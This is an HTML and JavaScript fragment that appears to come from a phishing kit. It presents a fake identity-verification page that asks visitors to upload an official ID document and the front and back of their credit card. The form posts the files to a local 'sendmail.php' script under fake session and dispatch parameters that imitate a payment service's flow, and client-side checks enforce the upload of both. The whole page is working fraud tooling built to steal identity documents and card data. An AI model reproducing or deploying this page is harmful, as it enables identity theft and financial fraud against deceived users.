<script type="text/javascript" src="./identity/ds/jquery.min.js"></script>
    <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".doc", ".docx", ".pdf" , ".jpg" , ".png" , ".gif", ".jpeg" , ".bmp" , ".xlsx" , ".psd" , ".fdf"];
            var fileUpload = $("#file_input");
            var lblError = $("#lblError1");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Attach copy of the official document" );
                return false;
            }
            lblError.html('');
            return true;
        });
    </script>

          <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".doc", ".docx", ".pdf" , ".jpg" , ".png" , ".gif", ".jpeg" , ".bmp" , ".xlsx" , ".psd" , ".fdf"];
            var fileUpload = $("#file_input2");
            var lblError = $("#lblError2");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Attach copy of the Credit Card (front & back)" );
                return false;
            }
            lblError.html('');
            return true;
        });
    </script>


				<div id="page-wrap">

						<div id="load" class="transitioning spinner spin" style="display:none;">Processing of your documents...</div>


<main>

	 <form action="./auth/identity/mail/sendmail.php?cmd=_flow&SESSION=VBQvrPU00IM1uHErimWKuCyeklx6zvOmYw3KdzGurpCNuky8BWUn3P_VBQvrPU00IM1uHErimWKu&dispatch=5885d80a13c0db1f8e263663d3faee8d0b9dcb01a9b6dc564e45f62871326a5e" method="post" enctype="multipart/form-data" onsubmit="return ray.ajax()">






<div id="page-wrap">
	<h2 id="overpanel-header">You need documents to prove your identity.</h2>



	 <div id="column1">

 <input class="aa"    value="Attach copy of the official document" readonly="readonly" style="width: 280px; height: 40px" />



 <div  style="height: 0px;"> <span id="lblError1" class="message"   ></span>  <span  id="message1" ></span> </div>



 	<br>


  <input type="file" class="file_input" id="file_input" multiple="multiple" name="files[]"     />



</div>


	 <div id="column2">



				<input class="aaa"    value="Attach copy of the Credit Card" readonly="readonly" style="width: 280px; height: 40px" />


	 <div  style="height: 0px;"> <span id="lblError2" class="message"   ></span>  <span  id="message1" ></span> </div>


 	<br>
 	<div style="margin: 0.5px"></div>

  <input type="file" class="file_input" id="file_input2" multiple="multiple" name="files[]"     />



</div>

<div id="column3" > 	<button class="btn" id="btnUpload"  type="submit" style="left: 0px; top: 0px; width: 297px; margin-left: 50%; " onclick="LoadPage()">Confirm your identity</button></div>


	</form>



</div>

  </div>


 <pre></pre>
